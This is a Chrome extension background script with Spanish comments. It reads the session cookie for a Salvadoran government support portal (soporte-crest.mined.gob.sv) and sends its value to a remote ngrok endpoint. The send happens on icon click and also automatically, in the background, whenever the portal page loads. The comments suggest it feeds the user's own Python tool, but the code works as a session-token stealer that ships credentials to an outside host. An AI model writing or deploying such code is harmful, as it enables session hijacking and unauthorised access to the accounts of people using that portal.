async function syncCookie() {
    const domain = "soporte-crest.mined.gob.sv";
    const cookieName = "ci_session_stv2";

    try {
        // Leemos la cookie directamente de la base de datos de Chrome
        const cookie = await chrome.cookies.get({
            url: "https://" + domain,
            name: cookieName
        });

        if (cookie) {
            console.log("¡Cookie atrapada! Enviando a Python...");

            // La enviamos a tu servidor remoto por Ngrok
            fetch("https://hypnoses-spender-sliver.ngrok-free.dev/update_cookie", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ cookie: cookie.value })
            })
                .then(response => {
                    if (response.ok) {
                        // Muestra un mensajito en Chrome para confirmar
                        chrome.action.setBadgeText({ text: "OK" });
                        chrome.action.setBadgeBackgroundColor({ color: "#28a745" });
                        setTimeout(() => chrome.action.setBadgeText({ text: "" }), 3000);
                    }
                })
                .catch(error => console.error("Error al enviar a Python:", error));

        } else {
            chrome.action.setBadgeText({ text: "ERR" });
            chrome.action.setBadgeBackgroundColor({ color: "#dc3545" });
            console.log("No se encontró la cookie. ¿Estás logueado en CREST?");
        }
    } catch (error) {
        console.error("Error de permisos:", error);
    }
}

// Mantener el comportamiento manual por si el usuario le da clic
chrome.action.onClicked.addListener((tab) => {
    syncCookie();
});

// ¡NUEVO! Sincronizar automáticamente cuando el usuario carga la página
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    // Si la página terminó de cargar y es el portal de tickets
    if (changeInfo.status === 'complete' && tab.url && tab.url.includes("soporte-crest.mined.gob.sv")) {
        console.log("Detectado acceso a CREST. Sincronizando en segundo plano...");
        syncCookie();
    }
});